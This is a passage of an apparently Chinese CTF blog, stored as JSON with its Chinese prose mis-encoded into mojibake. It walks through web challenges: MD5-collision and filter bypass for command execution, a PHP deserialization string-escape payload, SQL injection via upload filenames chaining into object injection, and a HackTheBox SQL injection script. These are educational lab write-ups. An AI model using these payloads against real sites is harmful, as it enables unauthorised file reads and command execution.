¤å¤–ï¼Œæ­å¥½æ‰å‘ç°â€¦â€¦)ï¼Œåˆšå¥½åšåšã€‚","text":"å‘ç°buuojä¸Šå®‰æ´µ2019çš„é¢˜ç›®æœ‰ç°æˆçš„ï¼Œä¸ç”¨åœ¨vpsä¸Šæ­äº†(ç¬¬ä¸€é¢˜é™¤å¤–ï¼Œæ­å¥½æ‰å‘ç°â€¦â€¦)ï¼Œåˆšå¥½åšåšã€‚ easy_webè¿›å»åurlæœ‰ä¸¤ä¸ªæ˜æ˜¾å‚æ•°ï¼Œç¬¬ä¸€ä¸ªç±»ä¼¼äºbase64ç¼–ç ï¼Œç¬¬äºŒä¸ªç”±å‚æ•°åçŸ¥é“å¯èƒ½æ˜¯rceå‚æ•° 1?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D; å…ˆè§£ç å‰é¢ä¸€ä¸ªå‚æ•°çš„å€¼ï¼Œå‘ç°base64è§£äº†ä¸¤æ¬¡åå¾—åˆ°ä¸€ä¸²æ•°å­—ï¼Œçœ‹èµ·æ¥åƒåå…­è¿›åˆ¶å­—ç¬¦ã€‚å°è¯•16è¿›åˆ¶è§£ç åå¾—åˆ°555.pnf0è¯å®äº†åŠ å¯†æ–¹å¼ã€‚åŠ ä¸Šå›¾ç‰‡çš„å›æ˜¾æœ‰base64çš„å†…å®¹ï¼Œå¯çŸ¥imgå‚æ•°ç”¨äºæ–‡ä»¶åŒ…å«ï¼Œé‚£ä¹ˆåŒ…å«ä¸‹index.phpå§ 1234567891011import base64import binasciistr='index.php'filename = str.encode(encoding='utf-8')hex = binascii.b2a_hex(filename)print(hex)base1 = base64.b64encode(hex)base2 = base64.b64encode(base1)print(base2.decode('utf-8')) å¾—åˆ°æºç  12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);if (preg_match(\"/flag/i\", $file)) &#123; echo '&lt;img src =\"./ctf3.jpeg\"&gt;'; die(\"xixiï½ no flag\");&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'&gt;&lt;/img&gt;\"; echo \"&lt;br&gt;\";&#125;echo $cmd;echo \"&lt;br&gt;\";if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i\", $cmd)) &#123; echo(\"forbid ~\"); echo \"&lt;br&gt;\";&#125; else &#123; if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) &#123; echo `$cmd`; &#125; else &#123; echo (\"md5 is funny ~\"); &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt; body&#123; background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; ç¬¬ä¸€ä¸ªå‚æ•°å·²ç»åˆ©ç”¨å®Œäº†ï¼Œè€Œç¬¬äºŒä¸ªå‚æ•°ç”¨äºrce,ä½†æ˜æ˜¾è¿‡æ»¤äº†è®¸å¤šè¯»å–æ–‡ä»¶çš„å‘½ä»¤ã€‚åŒæ—¶å¯çŸ¥è¦æ‰§è¡Œå‘½ä»¤å¿…é¡»ç»•è¿‡ä¸€å±‚MD5å¯¹æ¯”ã€‚åŸºäºä½¿ç”¨äº†phpå¼ºç›¸ç­‰ç¬¦å·ï¼Œå¯çŸ¥ä¸€å®šè¦æ‰¾åˆ°ä¸€å¯¹MD5ç›¸åŒçš„ä¸åŒå­—ç¬¦ä¸²ã€‚å¯ä»¥ç”¨æŸç§MD5ç¢°æ’ç”Ÿæˆå™¨å¾—åˆ°ã€‚æˆ‘ç›´æ¥ç”¨å®˜æ–¹wpé‡Œçš„å§ 12a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 ä¹‹åå°±æ˜¯æ‰§è¡Œå‘½ä»¤äº†ã€‚ç›´æ¥åˆ©ç”¨åŒ¹é…æ­£åˆ™é‡Œé¢\\çš„ç–å¿½ï¼Œç”¨å®ƒä½¿æˆ‘ä»¬çš„å…³é”®å­—æ„å»ºå‡ºæ¥ 1ca\\t%20&#x2F;flag cat &#x2F;flag æˆ–è€…ä½¿ç”¨æ²¡è¢«è¿‡æ»¤çš„è¯»å–æ–‡ä»¶çš„å‘½ä»¤ 1sort &#x2F;flag easy_serialize_phpé¢˜ç›®å¯¹æˆ‘æœ‰ç‚¹éš¾ï¼Œä½†æ˜¯æ‰“å¼€äº†ååºåˆ—åŒ–æ–°ä¸–ç•Œçš„å¤§é—¨ä¸€é“ååºåˆ—åŒ–åˆ©ç”¨é¢˜ï¼Œä¸Šæ¥ç›´æ¥ç»™äº†æºç  12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET['f'];function filter($img)&#123; $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[\"user\"] = 'guest';$_SESSION['function'] = $function;extract($_POST);if(!$function)&#123; echo '&lt;a href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;';&#125;if(!$_GET['img_path'])&#123; $_SESSION['img'] = base64_encode('guest_img.png');&#125;else&#123; $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));&#125;$serialize_info = filter(serialize($_SESSION));if($function == 'highlight_file')&#123; highlight_file('index.php');&#125;else if($function == 'phpinfo')&#123; eval('phpinfo();'); //maybe you can find something in here!&#125;else if($function == 'show_image')&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));&#125; æ€è·¯ä¸Šé¦–å…ˆçœ‹çœ‹å¯æ§çš„å‚æ•°ï¼Œæœ‰getä¼ å€¼çš„f,img_pathã€‚ä½†æ˜¯æ³¨æ„åˆ°img_pathæ­é…ä¸Šfä¸ºshow_imageæ—¶ï¼Œè¿”å›çš„å†…å®¹å¹¶ä¸å¯ç”¨ï¼Œå› ä¸º 1$_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;])); ä¸­ï¼Œæˆ‘ä»¬ä¼ çš„å€¼ç»è¿‡sha1åŠ å¯†åå¹¶æ²¡æœ‰è§£å¯†ï¼Œæ•…ä¸å¯ç”¨ã€‚æ­¤æ—¶å…³æ³¨å…¶ä»–é‡ç‚¹,æœ‰ä¸€å¥ 1extract($_POST); æ˜¯ä¸€ä¸ªå˜é‡è¦†ç›–çš„åˆ©ç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬çš„å˜é‡å€¼éƒ½å¯ä»¥é€šè¿‡postæ“ä½œæ”¹å˜ï¼Œè¿™æ ·å¯æ§çš„å‚æ•°å¤šäº†èµ·æ¥ã€‚åŒæ—¶æ³¨æ„åˆ°åºåˆ—åŒ–è¯­å¥ï¼Œä¼šåœ¨è°ƒç”¨show_imageæ—¶è¢«è§¦å‘ 1$serialize_info &#x3D; filter(serialize($_SESSION)); æ¼æ´ç‚¹æ­£åœ¨äºæ­¤ï¼Œåœ¨åºåˆ—åŒ–æ•°æ®ä¹‹åï¼Œå®ƒç»è¿‡äº†ä¸€å±‚è¿‡æ»¤æ‰ç»™å˜é‡èµ‹å€¼ã€‚è€Œä»æœ€ä¸Šæ–¹çš„è¿‡æ»¤å‡½æ•°å¯çŸ¥ï¼Œå‡ºç°è¢«è¿‡æ»¤çš„å…³é”®å­—ç›´æ¥æ›¿æ¢ä¸ºç©ºã€‚é‚£ä¹ˆè¿™æ˜¯å¦ä¼šæœ‰æ¼æ´å¯ä»¥ç”¨å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚å‡ºé¢˜äººå¦‚æ˜¯è¯´ï¼š ä»»ä½•å…·æœ‰ä¸€å®šç»“æ„çš„æ•°æ®ï¼Œå¦‚æœç»è¿‡äº†æŸäº›å¤„ç†è€ŒæŠŠç»“æ„ä½“æœ¬èº«çš„ç»“æ„ç»™æ‰“ä¹±äº†ï¼Œåˆ™æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ã€‚ å…¶æ„ä¹‰åœ¨äºï¼Œç»™useræ‰€èµ‹çš„å€¼åˆšå¥½24ä¸ªï¼Œè€Œè¿™24ä¸ªå­—ç¬¦ç”±äºè¿‡æ»¤flagçš„åŸå› ï¼Œåœ¨ç»è¿‡åºåˆ—åŒ–åè¢«ç½®ä¸ºç©ºã€‚è¿™æ—¶å°±å¯ä»¥åæ‰ä¸€ä¸ªfunctionï¼Œåšåˆ°ä»»æ„è¯»å–æ–‡ä»¶ã€‚ é¦–å…ˆä»æç¤ºphpinfoå¤„æ‰¾åˆ°ä¸€ä¸ªä¸å¯ç›´æ¥è¯»çš„phpæ–‡ä»¶ï¼Œæˆ‘ä»¬å…ˆå°è¯•åˆ©ç”¨æ¼æ´è¯»å–å®ƒçœ‹çœ‹ã€‚ï¼ˆç”±äºå…³é”®å­—é‡Œè¿‡æ»¤äº†f1agï¼Œæ‰€ä»¥åœ¨phpinfoç•Œé¢æœf1agå…³é”®å­—ï¼Œæœæ–­å‘ç°d0g3_f1ag.phpï¼‰ä¸‹é¢æˆ‘æ¥æ„é€ ä¸‹åºåˆ—åŒ–çš„ç±»ï¼Œä»æºç çŸ¥é“SESSIONç±»æœ‰ä¸‰ä¸ªå±æ€§ï¼š 123456789&lt;?phpclass SESSION&#123; var $user=\"flagflagflagflagflagflag\"; var $function='a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"test\";s:1:\"a\";&#125;';# å…¶ä¸­ä¸ºd0g3_f1ag.php base64ç¼–ç  var $img=\"MS5qcGc=\";# å€¼ä¸º1.jpgçš„base64ç¼–ç &#125;$a=new SESSION();echo(serialize($a)); ç”Ÿæˆçš„payloadå¦‚ä¸‹ï¼š 1O:7:\"SESSION\":3:&#123;s:4:\"user\";s:24:\"flagflagflagflagflagflag\";s:8:\"function\";s:61:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"test\";s:1:\"a\";&#125;\";s:3:\"img\";s:8:\"MS5qcGc=\";&#125; è€Œç»è¿‡è¿‡æ»¤å 1O:7:\"SESSION\":3:&#123;s:4:\"user\";s:24:\"\";s:8:\"function\";s:61:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"test\";s:1:\"a\";&#125;\";s:3:\"img\";s:8:\"MS5qcGc=\";&#125; æ­¤æ—¶userå±æ€§å¯¹åº”çš„å€¼è¢«ç½®ç©ºï¼Œé‚£ä¹ˆå®ƒå°±è¦å»æŠŠåé¢çš„24ä¸ªå­—ç¬¦ç½®ä¸ºå®ƒçš„å€¼ã€‚ä¹Ÿå°±æ˜¯ 1\";s:8:\"function\";s:59:\"a\" ç›¸å½“äºåæ‰äº†functionå±æ€§ï¼Œä½†æ˜¯æˆ‘ä»¬æ„é€ çš„$functionä¸­ï¼ŒåŒ…å«äº†imgå±æ€§çš„å€¼ï¼Œä»¥åŠæ„é€ çš„ä¸€ä¸ªtestå±æ€§çš„å€¼ï¼Œä½¿å¾—æˆ‘ä»¬çš„åºåˆ—åŒ–æ•°æ®ä»ç„¶æ˜¯æ»¡è¶³ä¸€ä¸ªç±»å¯¹åº”ä¸‰ä¸ªé”®å€¼ã€‚è¿™æ—¶å®ƒå¯¹åºåˆ—åŒ–æ•°æ®çš„åŒ¹é…å°±æ˜¯ç”±{å¼€å§‹ï¼Œåˆ°}ç»“æŸã€‚æ‰€ä»¥åé¢å¤šä½™çš„å­—ç¬¦&quot;;s:3:&quot;img&quot;;s:8:&quot;MS5qcGc=&quot;;}å…¨éƒ¨è¢«å¿½ç•¥ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬é€šè¿‡æ§åˆ¶functionå±æ€§çš„å€¼ï¼Œè¾¾åˆ°äº†æ§åˆ¶imgå±æ€§å€¼çš„æ•ˆæœï¼Œä»è€Œè§¦å‘ååºåˆ—åŒ–ï¼Œè¯»å–æ–‡ä»¶ã€‚æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š 1_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image (functionä¹Ÿå¯ä»¥ç›´æ¥getä¼ )å¦å¤–é¢˜ç›®æ„é€ çš„å…¶å®æ˜¯SESSIONæ•°ç»„è¿›è¡Œåºåˆ—åŒ–ï¼Œä½†æ˜¯åºåˆ—åŒ–æ ¼å¼ä¸€æ ·ï¼Œéƒ½å¯è¡Œã€‚ 12345&lt;?php$b=array(\"user\"=&gt;\"flagflagflagflagflagflag\", \"function\"=&gt;'a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"test\";s:1:\"a\";&#125;', \"img\"=&gt;\"MS5qcGc=\");echo(serialize($b)); ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ä¹Ÿæ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜ç›®ï¼Œæ„å›¾åœ¨äºååºåˆ—åŒ–ç»“åˆsqlæ³¨å…¥ã€‚åœ¨æºç å®¡è®¡ä¸Šä¸‹äº†ä¸å°‘åŠŸå¤«ã€‚å¦‚æœæˆ‘åœ¨æ¯”èµ›ä¸­åšå¤šåŠä¼šå¡åœ¨sqlæ³¨å…¥ä¸Šå§ã€‚ é¦–å…ˆè¿›å…¥é¡µé¢ï¼Œå¯ä»¥å‘ç°ç½‘ç«™åº•éƒ¨ç•™ä¸‹äº†wowouploadimageï¼Œå¯ä»¥æ‹¿åˆ°ä¸€ä»½æºç ã€‚ä¸»è¦å†…å®¹å¦‚ä¸‹ï¼šupload.php 12345678910111213141516171819&lt;?phpinclude(\"./helper.php\");class upload extends helper &#123; public function upload_base()&#123; $this-&gt;upload(); &#125;&#125;if ($_FILES)&#123; if ($_FILES[\"file\"][\"error\"])&#123; die(\"Upload file failed.\"); &#125;else&#123; $file = new upload(); $file-&gt;upload_base(); &#125;&#125;$a = new helper();?&gt; show.php 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpinclude(\"./helper.php\");$show = new show();if($_GET[\"delete_all\"])&#123; if($_GET[\"delete_all\"] == \"true\")&#123; $show-&gt;Delete_All_Images(); &#125;&#125;$show-&gt;Get_All_Images();class show&#123; public $con; public function __construct()&#123; $this-&gt;con = mysqli_connect(\"127.0.0.1\",\"root\",\"root\",\"pic_base\"); if (mysqli_connect_errno($this-&gt;con))&#123; die(\"Connect MySQL Fail:\".mysqli_connect_error()); &#125; &#125; public function Get_All_Images()&#123; $sql = \"SELECT * FROM images\"; $result = mysqli_query($this-&gt;con, $sql); if ($result-&gt;num_rows &gt; 0)&#123; while($row = $result-&gt;fetch_assoc())&#123; if($row[\"attr\"])&#123; $attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]); $attr = unserialize($attr_temp); &#125; echo \"&lt;p&gt;id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"&lt;/p&gt;\"; &#125; &#125;else&#123; echo \"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;\"; &#125; mysqli_close($this-&gt;con); &#125; public function Delete_All_Images()&#123; $sql = \"DELETE FROM images\"; $result = mysqli_query($this-&gt;con, $sql); &#125;&#125;?&gt; helper.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293&lt;?phpclass helper &#123; protected $folder = \"pic/\"; protected $ifview = False; protected $config = \"config.txt\"; // The function is not yet perfect, it is not open yet. public function upload($input=\"file\") &#123; $fileinfo = $this-&gt;getfile($input); $array = array(); $array[\"title\"] = $fileinfo['title']; $array[\"filename\"] = $fileinfo['filename']; $array[\"ext\"] = $fileinfo['ext']; $array[\"path\"] = $fileinfo['path']; $img_ext = getimagesize($_FILES[$input][\"tmp_name\"]); $my_ext = array(\"width\"=&gt;$img_ext[0],\"height\"=&gt;$img_ext[1]); $array[\"attr\"] = serialize($my_ext); $id = $this-&gt;save($array); if ($id == 0)&#123; die(\"Something wrong!\"); &#125; echo \"&lt;br&gt;\"; echo \"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;\"; &#125; public function getfile($input) &#123; if(isset($input))&#123; $rs = $this-&gt;check($_FILES[$input]); &#125; return $rs; &#125; public function check($info) &#123; $basename = substr(md5(time().uniqid()),9,16); $filename = $info[\"name\"]; $ext = substr(strrchr($filename, '.'), 1); $cate_exts = array(\"jpg\",\"gif\",\"png\",\"jpeg\"); if(!in_array($ext,$cate_exts))&#123; die(\"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;\"); &#125; $title = str_replace(\".\".$ext,'',$filename); return array('title'=&gt;$title,'filename'=&gt;$basename.\".\".$ext,'ext'=&gt;$ext,'path'=&gt;$this-&gt;folder.$basename.\".\".$ext); &#125; public function save($data) &#123; if(!$data || !is_array($data))&#123; die(\"Something wrong!\"); &#125; $id = $this-&gt;insert_array($data); return $id; &#125; public function insert_array($data) &#123; $con = mysqli_connect(\"127.0.0.1\",\"root\",\"root\",\"pic_base\"); if (mysqli_connect_errno($con)) &#123; die(\"Connect MySQL Fail:\".mysqli_connect_error()); &#125; $sql_fields = array(); $sql_val = array(); foreach($data as $key=&gt;$value)&#123; $key_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $key); $value_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $value); $sql_fields[] = \"`\".$key_temp.\"`\"; $sql_val[] = \"'\".$value_temp.\"'\"; &#125; $sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\"; mysqli_query($con, $sql); $id = mysqli_insert_id($con); mysqli_close($con); return $id; &#125; public function view_files($path)&#123; if ($this-&gt;ifview == False)&#123; return False; //The function is not yet perfect, it is not open yet. &#125; $content = file_get_contents($path); echo $content; &#125; function __destruct()&#123; # Read some config html $this-&gt;view_files($this-&gt;config); &#125;&#125;?&gt; å…ˆä»æ¯”è¾ƒç›´è§‚çš„åœ°æ–¹å¼€å§‹å®¡è®¡ã€‚æˆ‘ä¸ªäººé¦–å…ˆä»helper.phpå¼€å§‹è§‚å¯Ÿã€‚å› ä¸ºè¿™å¾ˆæœ‰å¯èƒ½å­˜åœ¨æ˜¯ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨çš„ä»£ç ã€‚æœç„¶é¦–å…ˆæ³¨æ„åˆ°ï¼Œhelperç±»ä¸­ï¼Œæœ‰ç€ç»å…¸çš„_destruct()é­”æœ¯æ–¹æ³•ï¼Œå®ƒè°ƒç”¨çš„view_file()æ–¹æ³•ï¼Œä¼šæ‰§è¡Œfile_get_contents()å‡½æ•°ã€‚æ˜¾ç„¶æ˜¯åˆ©ç”¨å®ƒã€‚å›è¿‡å¤´å†ä»”ç»†çœ‹ä¸‹è§¦å‘æ–¹å¼ã€‚é¦–å…ˆï¼Œåœ¨helper.phpä¸­ï¼Œå‘ç°å›¾ç‰‡çš„attrå±æ€§è¢«åºåˆ—åŒ–å­˜å‚¨ã€‚ 1$array[&quot;attr&quot;] &#x3D; serialize($my_ext); ä¹‹ååœ¨show.phpä¸­ï¼Œè°ƒç”¨äº†ä¸€æ¬¡ååºåˆ—åŒ– 1234if($row[\"attr\"])&#123;$attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]);$attr = unserialize($attr_temp);&#125; ç„¶åæ³¨æ„æˆ‘ä»¬çš„uploadå›¾ç‰‡æ“ä½œï¼Œä¼ å›¾ç‰‡åï¼Œè°ƒç”¨äº†check()å‡½æ•°ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯¹æ–‡ä»¶ååšæ£€æµ‹å°±è¢«ä¿å­˜ä¸ºinfoï¼Œä¹‹åä½œä¸ºå‚æ•°ä¼ è¿›äº†save()å‡½æ•°ã€‚save()æœ¬è´¨ä¸Šæ‰§è¡Œäº†ä¸€æ¬¡sqlè¯­å¥ï¼š 1$sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\"; ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å…¶å®æ˜¯é€šè¿‡æ§åˆ¶ä¸Šä¼ å›¾ç‰‡çš„æ–‡ä»¶åï¼Œè§¦å‘sqlæ³¨å…¥ï¼Œè¿›ä¸€æ­¥è§¦å‘ååºåˆ—åŒ–ï¼Œè¾¾åˆ°ç›®çš„ã€‚æ‰€ä»¥ç°ç”Ÿæˆååºåˆ—åŒ–payoad: 12345678&lt;?phpclass helper&#123; protected $ifview = True; protected $config = \"/flag\";&#125;$a=new helper();echo(serialize($a)); å¾—åˆ°ç»“æœéœ€è¦è°ƒæ•´ä¸º 1O:6:\"helper\":2:&#123;s:9:\"\\0\\0\\0ifview\";b:1;s:9:\"\\0\\0\\0config\";s:5:\"/flag\";&#125; è¿™æ˜¯ç”±äºprotectedçš„å±æ€§å†³å®šçš„ã€‚å¦‚æœæ˜¯privateåˆ™æ˜¯ä¸¤ä¸ª%00%00ã€‚ç„¶åæ„é€ æ–‡ä»¶åï¼Œæˆ‘ä»¬åªéœ€è®©æ–‡ä»¶çš„åºåˆ—åŒ–éƒ¨åˆ†æ”¹ä¸ºæˆ‘ä»¬çš„payloadã€‚åŸºäºæ™®é€šä¸Šä¼ æ‰§è¡Œè¯­å¥ä¸ºï¼š 1INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('1','1.jpg','jpg','pic/f20c76cc4fb41838.jpg','a:2:&#123;s:5:\"width\";i:1264;s:6:\"height\";i:992;&#125;') æˆ‘ä»¬æŠŠæ–‡ä»¶åæ”¹æ”¹ 1INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('1.jpg') å…¶ä¸­çš„ç”±äºå¼•å·é—®é¢˜ï¼Œæˆ‘ä»¬çš„payloadéœ€è¦å­—ç¬¦ä¸²è½¬16è¿›åˆ¶ã€‚ä¸Šä¼ æ–‡ä»¶å³å¯è§¦å‘å¾—åˆ°flag.","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"hackthebox-ezpz","slug":"hackthebox-ezpz","date":"2020-02-06T10:14:41.000Z","updated":"2021-02-18T05:09:14.384Z","comments":true,"path":"2020/02/06/hackthebox-ezpz/","link":"","permalink":"https://www.bycsec.top/2020/02/06/hackthebox-ezpz/","excerpt":"hacktheboxä¸Šçš„web challenge ezpzæ˜¯å»å¹´åäºŒæœˆæœ«æ‰æ–°å‡ºçš„ä¸€é“ctfé¢˜ç›®ã€‚è¿™é“é¢˜ç›¸å½“çš„æœ‰æ„æ€ï¼Œè€Œä¸”å¯¹æˆ‘è¿˜æ˜¯æ¯”è¾ƒæœ‰éš¾åº¦çš„ï¼Œä½†æ˜¯åšå‡ºæ¥çš„é‚£ä¸€ç¬é—´åˆå‘ç°å…¶å®å¹¶éé‚£ä¹ˆä»¤äººå›°æ‰°ï¼Œåè€Œå­¦åˆ°äº†è®¸å¤šã€‚æ‰€ä»¥åœ¨æ­¤è®°å½•ä¸€ä¸‹åšé¢˜è¿‡ç¨‹ã€‚æ„Ÿè°¢zjyå¸ˆå‚…ä»¥åŠå¤–å›½ç½‘å‹Z1LV3Rçš„æç¤º","text":"hacktheboxä¸Šçš„web challenge ezpzæ˜¯å»å¹´åäºŒæœˆæœ«æ‰æ–°å‡ºçš„ä¸€é“ctfé¢˜ç›®ã€‚è¿™é“é¢˜ç›¸å½“çš„æœ‰æ„æ€ï¼Œè€Œä¸”å¯¹æˆ‘è¿˜æ˜¯æ¯”è¾ƒæœ‰éš¾åº¦çš„ï¼Œä½†æ˜¯åšå‡ºæ¥çš„é‚£ä¸€ç¬é—´åˆå‘ç°å…¶å®å¹¶éé‚£ä¹ˆä»¤äººå›°æ‰°ï¼Œåè€Œå­¦åˆ°äº†è®¸å¤šã€‚æ‰€ä»¥åœ¨æ­¤è®°å½•ä¸€ä¸‹åšé¢˜è¿‡ç¨‹ã€‚æ„Ÿè°¢zjyå¸ˆå‚…ä»¥åŠå¤–å›½ç½‘å‹Z1LV3Rçš„æç¤º é¦–å…ˆè¿›å…¥é¡µé¢ï¼Œå‘ç°æœ‰ä¸¤ä¸ªæŠ¥é”™ï¼š å…¶ä¸­ï¼Œç¬¬ä¸€ä¸ªæŠ¥é”™å…¶å®å°±æ˜¯ 1PHP: Notice: Undefined variable æ„æ€æ˜¯æœ‰æœªå®šä¹‰å˜é‡ï¼Œé‚£ä¹ˆè‡ªç„¶å°±æ˜¯objäº†ã€‚æ‰€ä»¥ä¸‹ä¸€æ­¥æˆ‘ä»¬ä¼ å‚å˜é‡é‚£ä¹ˆå¦‚ä½•è§£å†³ç¬¬äºŒä¸ªé”™è¯¯å‘¢ï¼Ÿä»ä¸­å¯ä»¥çœ‹å‡ºï¼ŒIDä¹‹äºobjå¯èƒ½æ˜¯propertyä¸objectçš„å…³ç³»ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œobjå¯èƒ½æ˜¯åŒ…å«IDçš„æŸç§åºåˆ—åŒ–æ•°æ®çš„å˜é‡ã€‚å®é™…ä¸Šï¼Œå¦‚ä¸‹ä»£ç  123&lt;?php$obj=array(\"ID\"=&gt;1234);echo($obj-&gt;IDS);#æ­¤å¤„è®¿é—®ä¸€ä¸ªæœªå®šä¹‰çš„IDSè§¦å‘æŠ¥é”™ ä¸ 123&lt;?php$obj=json_decode(\"&#123;'ID':'1234'&#125;\");echo $obj-&gt;IDs; çš„è¿”å›éƒ½æ˜¯ï¼šæ‰€ä»¥æˆ‘ä»¬æ‰èƒ½çœ‹åˆ°å›æ˜¾ã€‚å› æ­¤å°è¯•æ„é€ æ•°æ®å§ã€‚åŠ ä¸Šé¢˜ç›®é¡µé¢æºç ä¸­æç¤ºäº†Hint : base64_encode($data)&gt;ï¼ˆæˆ–è€…æˆ‘ä»¬æŠŠobjç½®ä¸ºæ•°ç»„ï¼Œä¹Ÿå¯ä»¥è§¦å‘æŠ¥é”™ï¼Œæç¤ºæˆ‘ä»¬æ•°æ®éœ€è¦base64encodeï¼‰ç»è¿‡å°è¯•ï¼Œå¯ä»¥å‘ç°æ˜¯è¦å¯¹jsonæ•°æ®ç¼–ç ã€‚é‚£æˆ‘ä»¬ä¼ ä¸€ä¸ªIDå€¼ä¸º1çš„æ•°æ® 1?obj&#x3D;eyJJRCI6ICIxIn0&#x3D; è€Œä¼ 1&#39;è§¦å‘æŠ¥é”™ï¼Œä¼ 1&quot;æ— æŠ¥é”™ã€‚ç¡®è®¤æ˜¯å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œä¸”æ˜¯å•å¼•å·é—­åˆç±»å‹ã€‚äºæ˜¯ï¼Œé¢˜ç›®è¿›å…¥åˆ°äº†ä¸‹ä¸€é˜¶æ®µï¼Œsqlæ³¨å…¥ã€‚æ˜¾ç„¶ä¸ºäº†è®©æˆ‘ä»¬çš„payloadæ›´æ–¹ä¾¿ï¼Œæœ€å¥½å…ˆå†™å¥½expï¼š 1234567891011121314import requestsimport jsonimport base64from bs4 import BeautifulSoupurl = \"http://docker.hackthebox.eu:30163/index.php?obj=\"payload=\"1\"payload = base64.b64encode(json.dumps(&#123;\"ID\": payload&#125;).encode('utf-8'))payload = str(payload, 'utf-8')url += payloadr = requests.get(url)soup = BeautifulSoup(r.text, 'html.parser')body = soup.find('body').text.strip()print(body) äºæ˜¯é€šè¿‡FUZZï¼Œå‘ç°å­˜åœ¨ä¸å°‘è¿‡æ»¤ï¼š 123456order byï¼Œconcatinformation_schema.tableswherelimit 